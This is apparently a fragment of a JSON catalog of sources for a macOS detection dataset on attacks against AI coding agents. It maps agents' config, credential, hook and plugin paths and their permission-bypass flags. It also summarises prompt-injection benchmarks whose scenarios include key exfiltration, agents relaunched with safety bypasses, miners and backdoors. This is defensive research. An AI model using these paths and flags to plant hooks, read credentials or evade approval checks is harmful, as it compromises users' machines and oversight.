+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "main 5522c6f4, 2026-07-21",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-004",
+    "EAA-005",
+    "EAA-006",
+    "EAA-007",
+    "EAA-019"
+   ],
+   "eslogger_visible": "config.ts / out/config.js writes visible; config.js runs inside the extension host or cn (no separate exec); session JSON, .env reads and permissions.yaml writes visible; cn argv carries --auto and -p.",
+   "how_to_use": "Treat config.ts writes like hook plants; permissions.yaml gaining allow entries from a non-cn writer is EAA-002.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-029",
+   "name": "Gemini CLI source: settings tmp+rename, .env walk-up, chat transcripts, CLI flags, endpoint env",
+   "url": "https://raw.githubusercontent.com/google-gemini/gemini-cli/89e9d25d67e7dc7cb0deb84ad2c3474b7a392d31/packages/cli/src/config/settings.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "commentJson.ts:25-44 writes .<basename>.<pid>.<ms>.<counter>.tmp then renameSync (fallback direct write). settings.ts:607-645 findEnvFile walks up from cwd: <dir>/.gemini/.env (trusted only), <dir>/.env, then ~/.gemini/.env and ~/.env. GEMINI_CLI_SYSTEM_SETTINGS_PATH, GEMINI_CLI_SYSTEM_DEFAULTS_PATH. Chats: ~/.gemini/tmp/<project>/chats/session-<ts>-<shortId>.jsonl via appendFileSync, atomic temp+rename rewrites. logs.json, checkpoint-<tag>.json. save_memory writes ~/.gemini/GEMINI.md. Flags: -p, --skip-trust, -s/--sandbox, -y/--yolo, --approval-mode default|auto_edit|yolo|plan, --allowed-mcp-server-names, --allowed-tools, --extensions. Env: GOOGLE_GENAI_USE_GCA, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GEMINI_BASE_URL, GEMINI_API_KEY, GEMINI_CLI_CUSTOM_HEADERS. Extensions: gemini-extension.json, .gemini-extension-install.json, per-extension .env.",
+   "license": "Apache-2.0",
+   "redistributable": "yes",
+   "published": "commit 89e9d25d, 2026-11-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-004",
+    "EAA-005",
+    "EAA-007",
+    "EAA-009"
+   ],
+   "eslogger_visible": "Settings write = create .settings.json.<pid>.<ms>.<n>.tmp then rename; .env creates/writes and startup opens visible; chats are repeated writes; flags in argv; env-only base URL invisible unless written to a file.",
+   "how_to_use": "Add .gemini/.env and ~/.gemini/.env as control-plane paths (they can set GOOGLE_GEMINI_BASE_URL). Benign tmp regex ^\\.settings\\.json\\.\\d+\\.\\d+\\.\\d+\\.tmp$. ~/.gemini/GEMINI.md is normal only when gemini writes it. Argv: gemini -p with -y/--approval-mode yolo/--skip-trust from a non-terminal parent.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-030",
+   "name": "Gemini CLI source: Storage paths, GEMINI_CLI_HOME, system settings, sandbox runtime dir",
+   "url": "https://raw.githubusercontent.com/google-gemini/gemini-cli/89e9d25d67e7dc7cb0deb84ad2c3474b7a392d31/packages/core/src/config/storage.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "At 89e9d25d. homedir() = GEMINI_CLI_HOME when set. ~/.gemini: oauth_creds.json, settings.json, google_accounts.json, trustedFolders.json (override GEMINI_CLI_TRUSTED_FOLDERS_PATH), installation_id, commands/, skills/, policies/, keybindings.json, agents/, policy_integrity.json, history/<id>, tmp/<project>/memory/skills, tmp/<project>/shell_history; mcp-oauth-tokens.json and a2a-oauth-tokens.json in the runtime dir, which moves to ~/.cache/.gemini under SANDBOX=sandbox-exec; ~/.agents/skills. macOS system dir /Library/Application Support/GeminiCli (settings.json overridable by GEMINI_CLI_SYSTEM_SETTINGS_PATH; policies). Workspace .gemini/{settings.json,commands,skills,agents,policies}, .agents/skills, .gemini/extensions/gemini-extension.json.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit 89e9d25d, 2026-11-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-006",
+    "EAA-008",
+    "EAA-009",
+    "EAA-015"
+   ],
+   "eslogger_visible": "Plain file paths: credential reads and settings/trustedFolders.json writes visible; GEMINI_CLI_HOME and *_PATH overrides only via exec env and activity under an unusual root.",
+   "how_to_use": "Expand the Gemini path list (above). A trustedFolders.json write by a non-gemini process is a trust-bypass case.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-031",
+   "name": "GitHub Copilot CLI command reference: allow-all flags, env vars, cross-agent instruction/skill/agent discovery",
+   "url": "https://raw.githubusercontent.com/github/docs/e44c283a7f901f63aead1ea13cf9062956706e24/content/copilot/reference/copilot-cli-reference/cli-command-reference.md",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Options: --add-dir (also loads that dir's .github/.agents/.claude skills and .github/.claude agents as trusted), --additional-mcp-config (JSON or @file), --allow-all (= tools+paths+urls), --allow-all-tools (env COPILOT_ALLOW_ALL), --allow-tool/--deny-tool, --autopilot, --no-ask-user, --disable-builtin-mcps, --secret-env-vars, --yolo. Env: COPILOT_HOME, COPILOT_GITHUB_TOKEN, COPILOT_GH_HOST, COPILOT_PROVIDERS_CONFIG, COPILOT_PROVIDER_API_KEY_COMMAND, COPILOT_CUSTOM_INSTRUCTIONS_DIRS, COPILOT_SKILLS_DIRS, GITHUB_COPILOT_PROMPT_MODE_REPO_HOOKS/_WORKSPACE_MCP/_EXTENSIONS. Instructions merge CLAUDE.md, GEMINI.md, AGENTS.md, .github/instructions/**/*.instructions.md, .claude/rules/**/*.md, .github/copilot-instructions.md, ~/.copilot/copilot-instructions.md, ~/.copilot/instructions/**. MCP priority: --additional-mcp-config, plugins, workspace .mcp.json/.github/mcp.json (trusted only), ~/.copilot/mcp-config.json. Skills: .github/skills, .agents/skills, .claude/skills, ~/.copilot/skills, ~/.agents/skills. Agents: ~/.copilot/agents, .github/agents, .claude/agents.",
+   "license": "CC-BY-4.0",
+   "redistributable": "yes",
+   "published": "commit e44c283a, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-001",
+    "EAA-002",
+    "EAA-004",
+    "EAA-006",
+    "EAA-007",
+    "EAA-014"
+   ],
+   "eslogger_visible": "Flags in copilot argv; COPILOT_ALLOW_ALL and PROMPT_MODE_* env only; discovery shows as normal cross-agent opens by copilot.",
+   "how_to_use": "Argv: copilot -p with --yolo/--allow-all/--allow-all-tools/--additional-mcp-config @/tmp/... Writes to .claude/rules/**, CLAUDE.md, GEMINI.md, .mcp.json, .claude/skills and .claude/agents also reach Copilot. COPILOT_PROVIDER_API_KEY_COMMAND and providers.json are EAA-007 surfaces.",
+   "downloaded_to": [
+    "datasets/copilot-cli-docs"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-032",
+   "name": "GitHub Copilot CLI configuration-directory reference (~/.copilot layout)",
+   "url": "https://raw.githubusercontent.com/github/docs/e44c283a7f901f63aead1ea13cf9062956706e24/content/copilot/reference/copilot-cli-reference/cli-config-dir-reference.md",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "~/.copilot: agents/, config.json (auth, installed plugins), copilot-instructions.md, extensions/, hooks/, ide/, installed-plugins/, instructions/, logs/, lsp-config.json, mcp-config.json, mcp-oauth-config/ (OAuth fallback without keychain), mcp-secrets/, permissions-config.json, plugin-data/, providers.json (BYOK registry), session-state/, command-history-state/, session-store.db, settings.json, skills/. COPILOT_HOME relocates (--config-dir legacy); cache ~/Library/Caches/copilot (COPILOT_CACHE_HOME). storeTokenPlaintext allows plaintext tokens in config.json without a keychain. Repo .github/copilot/settings.json and settings.local.json; .github/allowed_models.txt. Downloaded with the command, plugin, programmatic and hooks reference pages.",
+   "license": "CC-BY-4.0 (github/docs spdx; docs content under LICENSE, code under LICENSE-CODE)",
+   "redistributable": "yes",
+   "published": "commit e44c283a, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-005",
+    "EAA-006",
+    "EAA-008",
+    "EAA-009",
+    "EAA-015"
+   ],
+   "eslogger_visible": "Plain files; session-state appends by copilot; with storeTokenPlaintext, non-copilot reads of ~/.copilot/config.json are credential reads.",
+   "how_to_use": "Adds the Copilot CLI path set (credentials, hooks, MCP, transcripts, extensions/plugins, permissions-config.json). A non-copilot write to permissions-config.json is EAA-002; a settings.json write enabling storeTokenPlaintext weakens credentials.",
+   "downloaded_to": [
+    "datasets/copilot-cli-docs"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-033",
+   "name": "GitHub Copilot hooks reference: hook file locations incl. repo .claude/settings.json and policy.d",
+   "url": "https://raw.githubusercontent.com/github/docs/e44c283a7f901f63aead1ea13cf9062956706e24/content/copilot/reference/hooks-reference.md",
+   "related_urls": [
+    "https://code.visualstudio.com/docs/copilot/customization/hooks"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "CLI hook sources in load order: policy files /etc/github-copilot/policy.d/*.json (root-owned, not disableable, loaded regardless of trust); repo .github/hooks/*.json; user ~/.copilot/hooks/*.json; inline hooks in .github/copilot/settings.json / settings.local.json; repo .claude/settings.json and .claude/settings.local.json; ~/.copilot/settings.json (config.json no longer read for hooks); plugin hooks.json. Cloud agent reads only .github/hooks/*.json. Malformed hook items are dropped while siblings load. The VS Code Copilot harness reads the same sources incl. repo .claude/settings*.json; events sessionStart, userPromptSubmitted, preToolUse, postToolUse, preCompact, subagentStart/Stop, agentStop, sessionEnd; the older Local harness reads Claude files only with chat.useClaudeHooks.",
+   "license": "CC-BY-4.0 (github/docs); VS Code page license unknown",
+   "redistributable": "yes",
+   "published": "commit e44c283a, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-014"
+   ],
+   "eslogger_visible": "Hook file writes visible incl. root writes to /etc/github-copilot/policy.d; execution is a hook exec under copilot or the VS Code extension host.",
+   "how_to_use": "A repo .claude/settings.json is read by Claude Code, Copilot CLI, the VS Code Copilot harness and Devin: one plant, four consumers. Basis for multi-consumer positives.",
+   "downloaded_to": [
+    "datasets/copilot-cli-docs"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-035",
+   "name": "OpenAI Codex source: CODEX_HOME, config layers, atomic config writes, AGENTS.md",
+   "url": "https://raw.githubusercontent.com/openai/codex/48524f337a84b570f0c2453ca43ec9a1a29375c0/codex-rs/utils/path-utils/src/lib.rs",
+   "related_urls": [
+    "https://learn.chatgpt.com/docs/agent-configuration/agents-md"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Codex at 48524f33. home-dir/lib.rs:13-63: CODEX_HOME if set (must exist, canonicalized), else ~/.codex. config/loader/README.md:26-35 precedence (high first): MDM managed_config.toml (legacy), managed_config.toml (legacy), session -c flags, project .codex/config.toml, user profile config, user config.toml, cloud-managed bundle, /etc/codex/config.toml. loader/macos.rs: MDM via CFPreferences app id com.openai.codex, keys config_toml_base64, requirements_toml_base64. A selected profile is ${CODEX_HOME}/<name>.config.toml. path-utils write_atomically (154-166): create_dir_all(parent), NamedTempFile::new_in(parent), persist() renames over target; core/src/config/edit.rs persists config.toml this way. Instructions: AGENTS.override.md then AGENTS.md; first non-empty file in CODEX_HOME wins; project discovery walks root to cwd, one file per dir; project_doc_fallback_filenames; project_doc_max_bytes 32 KiB.",
+   "license": "Apache-2.0 (GitHub API spdx for openai/codex)",
+   "redistributable": "yes",
+   "published": "commit 48524f33, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-008",
+    "EAA-002"
+   ],
+   "eslogger_visible": "Config edit = create of ~/.codex/.tmpXXXXXX then rename onto config.toml by codex; AGENTS.md reads are opens; MDM values via CFPreferences produce no codex file event (inferred).",
+   "how_to_use": "Path rules: ~/.codex/{config.toml,AGENTS.md,AGENTS.override.md,*.config.toml}, <repo>/.codex/config.toml, /etc/codex/config.toml. codex .tmpXXXXXX->config.toml rename is ordinary; the same rename by node postinstall or curl|sh is the case; a new <name>.config.toml or unusual CODEX_HOME is an EAA-008 signal.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-036",
+   "name": "opencode docs and source: XDG paths, config precedence incl. managed macOS paths, auto-loaded JS plugins, Claude-compat reads",
+   "url": "https://opencode.ai/docs/config/",
+   "related_urls": [
+    "https://opencode.ai/docs/plugins/",
+    "https://opencode.ai/docs/rules/",
+    "https://opencode.ai/docs/cli/"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Precedence low->high: remote .well-known/opencode; ~/.config/opencode/opencode.json; OPENCODE_CONFIG; project opencode.json; .opencode dirs (agents, commands, plugins); OPENCODE_CONFIG_CONTENT; managed /Library/Application Support/opencode/; MDM .mobileconfig. OPENCODE_CONFIG_DIR; {env:VAR}, {file:path}. Plugins: .opencode/plugins/ and ~/.config/opencode/plugins/ auto-load; npm plugins installed with Bun into ~/.cache/opencode/node_modules/; hooks tool.execute.before/after, shell.env. Rules: AGENTS.md walking up, ~/.config/opencode/AGENTS.md, fallbacks CLAUDE.md and ~/.claude/CLAUDE.md, skills from ~/.claude/skills/; OPENCODE_DISABLE_CLAUDE_CODE(_PROMPT,_SKILLS). CLI: opencode run --auto; OPENCODE_PERMISSION, OPENCODE_DISABLE_PROJECT_CONFIG, OPENCODE_DB, OPENCODE_MODELS_URL; keys in ~/.local/share/opencode/auth.json. Source (anomalyco/opencode dd9a5ab6) uses XDG dirs even on macOS (~/.local/share/opencode, ~/.cache/opencode, ~/.config/opencode, ~/.local/state/opencode, $TMPDIR/opencode).",
+   "license": "MIT (source, GitHub API spdx anomalyco/opencode); docs license unknown",
+   "redistributable": "yes",
+   "published": "source dd9a5ab6, 2026-11-04; docs unknown",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-006",
+    "EAA-007",
+    "EAA-009",
+    "EAA-015",
+    "EAA-019",
+    "EAA-021"
+   ],
+   "eslogger_visible": "Plugin file writes visible; plugins run in-process (no exec); startup npm install = bun exec + writes under ~/.cache/opencode/node_modules; auth.json reads visible; OPENCODE_* env only.",
+   "how_to_use": "Treat .opencode/plugins/* and ~/.config/opencode/plugins/ as auto-executed code (hook severity); additions to the plugin key are EAA-009; ~/.cache/opencode/node_modules is an EAA-021 target.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-037",
+   "name": "Qwen Code source and docs: ~/.qwen layout, QWEN_HOME/QWEN_RUNTIME_DIR, system settings paths, JS locales, OPENAI_BASE_URL",
+   "url": "https://raw.githubusercontent.com/QwenLM/qwen-code/624d10532ab82edc402f7bbf717e5d11b2808074/packages/core/src/config/storage.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Layout parallels Gemini CLI. ~/.qwen/{oauth_creds.json, mcp-oauth-tokens.json, settings.json, installation_id, commands, memory.md, workflows, extensions, skills, locales/*.js}; skill provider dirs .qwen and .agents (~/.agents/skills); QWEN_RUNTIME_DIR, QWEN_HOME; runtime projects/<id> and tmp/<hash> (chats under ~/.qwen/projects/<id>/chats); project .qwen/{settings.json,commands,workflows}; generated workflow JS <projectDir>/workflows/generated/inline/<runId>.js; .qwen/extensions/qwen-extension.json. macOS /Library/Application Support/QwenCode/{system-defaults.json,settings.json} (QWEN_CODE_SYSTEM_DEFAULTS_PATH, QWEN_CODE_SYSTEM_SETTINGS_PATH). Custom UI languages load JS from ~/.qwen/locales/. OPENAI_BASE_URL/OPENAI_API_KEY. Approval modes plan, default, auto-edit, auto, yolo; /approval-mode yolo --project|--user persists.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit 624d1053, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-004",
+    "EAA-005",
+    "EAA-007",
+    "EAA-008",
+    "EAA-009",
+    "EAA-019"
+   ],
+   "eslogger_visible": "File events on all paths; locale JS and workflow JS run in-process (no exec); a persisted yolo mode is a settings.json write.",
+   "how_to_use": "Qwen path rules; ~/.qwen/locales/*.js is a little-known code-load persistence spot; yolo in settings is EAA-002; QWEN_HOME/QWEN_RUNTIME_DIR are shadow-dir surfaces.",
+   "downloaded_to": [],
+   "value": 4
+  },
+  {
+   "id": "SRC-038",
+   "name": "vercel-labs/skills (npx skills): 79-agent skill-directory table and benign cross-agent fan-out installer",
+   "url": "https://raw.githubusercontent.com/vercel-labs/skills/9197d919034d19010ae303cf96bf19ad087dd4be/src/agents.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "src/agents.ts defines 79 agents with project skillsDir, globalSkillsDir and detectInstalled() probe; resolves CLAUDE_CONFIG_DIR, CODEX_HOME, XDG_CONFIG_HOME (e.g. Codex global ~/.agents/skills, Windsurf ~/.codeium/windsurf/skills). UNIVERSAL_SKILLS_DIR .agents/skills; lock ~/.agents/.skill-lock.json or $XDG_STATE_HOME/skills/.skill-lock.json. Local file: derived agents.json (79 records; ~18 keep an unresolved '<...>' expression), extracted as text, nothing executed.",
+   "license": "MIT (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit 9197d919, 2026-11-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-009",
+    "EAA-014",
+    "EAA-016"
+   ],
+   "eslogger_visible": "One npx skills add = node exec, creates under ~/.agents/skills/<name>/, symlink creates in other agents' skills dirs, lock write; existsSync probes (stat) are outside our event set.",
+   "how_to_use": "Merge the 79 skill dirs into path rules (Windsurf, Goose, Crush, Kiro, Junie, Trae, OpenHands, Factory...). Hard negative for EAA-014/016: one user-run process symlinking a skill into many agents; positive twin from a postinstall or non-terminal parent.",
+   "downloaded_to": [
+    "datasets/agent-skill-dirs-vercel"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-040",
+   "name": "AIShellJack replication package (prompt injection via coding-rule files in Cursor/Copilot)",
+   "url": "https://figshare.com/articles/dataset/Replication_packages_for_AIShellJack/30111988",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "For arXiv 2509.22040. linux_atomic_tests_attack_payloads.json: 314 payloads from Atomic Red Team (attack_technique, test_guid, executor, supported_platforms (120 incl. macos), input_arguments, categories: defense-evasion 113, discovery 56, credential-access 39, privilege-escalation 38, persistence 37, execution 30, ...); README says they sit in curated .cursorrules across 5 codebases covering 70 techniques. command_execution_cursor_auto_search_with_lepton.json: 304 Cursor auto-mode runs (expected_command, actual_commands ~1.7/run, matched_tokens, match_ratio, correct_run (token-overlap heuristic: 262 true, 42 false; 28 logged no commands), has_exact_match 17). Labeling_results.xlsx, report, sample .cursorrules (saved as dot-cursorrules.txt). raw_results.zip (1.68 GB) not downloaded.",
+   "license": "CC-BY-4.0 (figshare API). Bundled LICENSE (Apache-2.0) belongs to the sample search_with_lepton repo.",
+   "redistributable": "yes",
+   "published": "figshare v4 2025-09-13 (DOI 10.6084/m9.figshare.30111988.v4); paper v2 2026-04-28",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018",
+    "EAA-004",
+    "EAA-002",
+    "EAA-015"
+   ],
+   "eslogger_visible": "Every actual_commands entry is an exec under Cursor's helper tree with file effects (crontab/rc edits, chmod, deletes, /etc writes); .cursorrules reads are opens. Network legs and the model's decision not visible.",
+   "how_to_use": "120 macOS-capable payloads become cases: plant a rules file, replay recorded actual_commands under a Cursor or Claude Code parent on a disposable Mac, capture eslogger. 42 correct_run=false runs are near-misses/no-ops. Payloads are generic ATT&CK, not agent-config targets.",
+   "downloaded_to": [
+    "datasets/aishelljack"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-041",
+   "name": "Coding-Agent Tool-Call Safety (Agent Approve policy-gate dataset)",
+   "url": "https://huggingface.co/datasets/agentapprove/coding-agent-tool-call-safety",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "2,963 synthetic Claude Code tool invocations (dev 1,535, holdout 1,108, confirmation 320; 122 families) labeled against 28 policy rules in three settings (truth_tool_only, truth_user_request, truth_bounded_context). Fields: id, family, split, tags, tool_name, tool_arguments, context, truth_*, provenance_*, rationale, rulebook_refs, evidence_*, quarantine. Tools: Bash 2,024, mcp__* 492, Edit 258, Write 135, MultiEdit 33, Read 16. tool_only positives: send-data-to-external-host 797, read-credential-material 282, change-security-or-persistence 241, permanent-deletion 217, download-and-execute-code 122, edit-shell-profile-or-dotfiles 106, git-change-remote-or-hooks 85. Tags: decoy-context 903, context-flip 785, lookalike 693, injection 282, docs-mention 200, quoted 197. Paths in args: .env ~201, .ssh 46, .zshrc 31, .aws 20, LaunchAgents 6, .claude/settings.json 6. Paper arXiv 2611.02155. Never executed.",
+   "license": "CC-BY-4.0, copyright 2026 Agent Approve LLC (card and LICENSE; asks for credit and citation)",
+   "redistributable": "yes",
+   "published": "2026-11-03 (paper 2026-11-01)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015",
+    "EAA-018",
+    "EAA-003"
+   ],
+   "eslogger_visible": "Bash -> exec + touched files; Write/Edit -> create/close-modified; Read -> open; MCP mostly invisible. Events must be synthesized from arguments.",
+   "how_to_use": "Large labeled source of hard negatives (lookalike, decoy-context, docs-mention) and positives (credential reads, dotfile/persistence edits, git hook/remote changes). Synthesize eslogger events under a Claude Code parent; map 28 rules to keep/judge categories.",
+   "downloaded_to": [
+    "datasets/agentapprove-toolcall-safety"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-042",
+   "name": "IPI Arena open-source benchmark: coding-agent behaviors (Gray Swan)",
+   "url": "https://github.com/GraySwanAI/ipi_arena_os",
+   "related_urls": [
+    "https://huggingface.co/datasets/sureheremarv/ipi_arena_attacks"
+   ],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "41 indirect-injection behaviors from arXiv 2603.15714 (tool 18, coding 15, browser 8). Each coding behavior JSON: id, objective, criteria, system_prompt (OpenHands, Claude-Code-style CLI, Codex CLI, Cursor/Nimbus, DevOps CLI), seeded messages with a {fill} attack slot, tools, llm_judge_context, tool_judge with expected-args regex. Coding: agents-share-keys (hidden AGENTS.md comment drives pushing the repo with .env keys to a new gh repo), free-the-agents (Issues thread makes the agent run claude --dangerously-skip-permissions), codex-launcher-cascade (README makes the agent run codex exec --sandbox danger-full-access recursively), nimbus-llm-exfil, ssh-key-deployment-injection, stealth-dependency-append, launch-crypto-miner, delete-tmp, leak-weights, leak-codebase-zip, docker-injection, code-backdoor, parser-backdoor, change-test-to-true, memory-bomb. HF companion: 95 Qwen-generated attack strings over 28 behaviors (50 for 12 coding behaviors); card says they did not transfer to closed models.",
+   "license": "MIT (GitHub API; LICENSE 'Copyright (c) 2025 Gray Swan AI'); HF attack strings MIT (card YAML)",
+   "redistributable": "yes",
+   "published": "repo 2026-02-17..2026-03-18 (HEAD 5e2e2859); HF 2026-03-06..18",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-001",
+    "EAA-002",
+    "EAA-018",
+    "EAA-015"
+   ],
+   "eslogger_visible": "Judged end actions are shell commands or file edits: exec of claude/codex with bypass flags (agent launched by an agent), git/gh push, zip, curl, nohup miner, rm, requirements/Dockerfile writes, .env/~/.ssh reads. Injected text and web_fetch not visible.",
+   "how_to_use": "EAA-001/002 cases (agent spawning claude --dangerously-skip-permissions or codex exec --sandbox danger-full-access) and AGENTS.md/README injection; turn each tool_judge regex into a command line replayed under a Claude/Codex parent; benign twins without flags. Scenarios, not recorded runs.",
+   "downloaded_to": [
+    "datasets/ipi-arena-coding"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-043",
+   "name": "MCPHunt agent traces (cross-boundary credential propagation in multi-server MCP agents)",
+   "url": "https://huggingface.co/datasets/lihaonan0716/mcphunt-agent-traces",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "6,786 traces (NeurIPS 2026 E&D, arXiv 2604.27819). main/: 3,615 traces, 5 models, 147 tasks, 7 environment variants (risky_v1/v2/v3, benign, hard_neg_v1/v2/v3); also mitigation (2,706), live_guard_defense (387), browser_replication (78). Canary credentials tracked through MCP servers. Downloaded main/gpt_5_2.json: 723 traces (risky 147/120/120, benign 147, hard_neg 135/27/27); 10 mechanisms (file_to_file, file_to_doc, db_to_artifact, forced_multi_hop, config_to_script, sensitive_to_shell, git_history_leak, indirect_exposure, browser_to_local, benign_control); outcomes 525 safe_success, 100 safe_failure, 87 unsafe_success, 11 unsafe_failure. Event fields: turn, server, tool, args, result_preview, result_full, canary_in_*, success, latency_ms, timestamp. Top tools execute_command 2,071, read_file 1,890, write_file 712.",
+   "license": "CC-BY-4.0 (card YAML and License section)",
+   "redistributable": "yes",
+   "published": "HF 2026-04-29..2026-10-23 (rev 8f05fed6)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015",
+    "EAA-018"
+   ],
+   "eslogger_visible": "filesystem-MCP read/write/create map to open/create/close-modified by the MCP server process; execute_command to exec under the shell server; git tools to git exec; sqlite, browser and canary movement not visible.",
+   "how_to_use": "Matched benign/risky/hard-negative sets; convert with the MCP server process as actor; measure that config_to_script and sensitive_to_shell are kept while benign/hard_neg stay quiet.",
+   "downloaded_to": [
+    "datasets/mcphunt"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-044",
+   "name": "RawTrail rule fixtures, efficacy scenarios and noise corpus",
+   "url": "https://github.com/RawTrail/RawTrail",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "benchmark",
+   "what": "MIT macOS agent recorder/EDR. Downloaded: 92 rule dirs with 105 positive and 42 negative JSON fixtures (events + expected_findings, ESF-derived envelope; exec 155, fork 154, open 19, btm_launch_item_add 13, network_connect 7, tcc_modify 4, dns_query 4, agent_credential_* 4, file delete/rename/truncate 4). Rules include agent_credential_read, credential_keychain_dump, credential_browser_store_read, persistence_launchagent/login_item/ssh_authorized_keys, privilege_launchd_plist_write, plus 70 Sigma macOS ports. test/efficacy: 23 ATT&CK scenario/expected YAML pairs; T1552.004 agent-credential-read/block carry CLAUDE_CODE_SESSION_ID/CLAUDE_PID/AI_AGENT markers; noise/ (developer-workstation, homebrew-update, agent-upgrade-cutover) expects zero alerts. Demo host streams alex-mbp.jsonl (952 lines) and ci-builder.jsonl (591). Also a poisoned-repo demo README with a hidden HTML comment telling AI assistants to print a deploy SSH key: live injection text.",
+   "license": "MIT (LICENSE 'Copyright (c) 2026 Victor Lyuboslavsky and contributors'; GitHub API spdx MIT)",
+   "redistributable": "yes",
+   "published": "commit 7affc8eb, 2026-11-03",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015",
+    "EAA-018",
+    "EAA-019"
+   ],
+   "eslogger_visible": "exec, fork, open, btm_launch_item_add, tcc_modify, file delete/rename/truncate map 1:1 to eslogger; network_connect/dns_query have no counterpart; agent_credential_* come from RawTrail's guard, not ES.",
+   "how_to_use": "Convert positives/negatives to eslogger JSON (agent credential reads with Claude session env, persistence, keychain); noise YAMLs as zero-alert background. Rebuild the poisoned-repo case ourselves. Never feed that README to an agent.",
+   "downloaded_to": [
+    "datasets/rawtrail-fixtures"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-045",
+   "name": "SKILL-INJECT (prompt injection in agent skill files vs Claude Code, Codex, Gemini CLI)",
+   "url": "https://github.com/aisa-group/skill-inject",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "benchmark",
+   "what": "Plants instructions in SKILL.md files (README: 44 skills) and runs Claude Code, Codex and Gemini CLI in Docker on tasks invoking the skill under 3 policy conditions. README: 41 contextual + 30 obvious injections; data files hold 48 contextual + 36 obvious definitions (68 direct, 16 script, counting variants). Obvious fields: id, title, injection_goal, instructions, type, tasks (prompt, skill, line_num, injection_prefix, task_files), task_scripts, startup_scripts, judge_prompt. Goals: download-and-execute, full delete, encrypt-all, API/SSH key exfil, clipboard/screenshot/search-history exfil, system-prompt exfil, remote payload; contextual: chmod 777, git remote change, force push, backdoor port, backup/deletion, 'skip security checks'. Results not in repo.",
+   "license": "MIT per GitHub API; LICENSE text names 'The Bootstrap Authors' (apparently copied), so licensor ambiguous",
+   "redistributable": "yes",
+   "published": "repo 2026-02-22..2026-08-29 (HEAD 182f3d9d)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-018",
+    "EAA-009",
+    "EAA-015"
+   ],
+   "eslogger_visible": "Agent's open of a SKILL.md (exact Docker path not checked), then shell commands (cat SSH keys, tar, curl, rm -rf, chmod, git remote set-url), writes/deletes, bundled script exec. Exfil and model compliance not visible.",
+   "how_to_use": "Reproduce a handful on a disposable Mac: install skill, run Claude Code with the task prompt, capture eslogger. Chain to test: read of a just-installed skill then credential reads or destructive commands; benign runs as hard negatives. Prompts only.",
+   "downloaded_to": [
+    "datasets/skill-inject"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-046",
+   "name": "Elastic detection-rules: GenAI agent, macOS and AI audit-integration rules",
+   "url": "https://github.com/elastic/detection-rules",
+   "related_urls": [],
+   "angles": [
+    "telemetry",
+    "macos-threats"
+   ],
+   "kind": "detection-content",
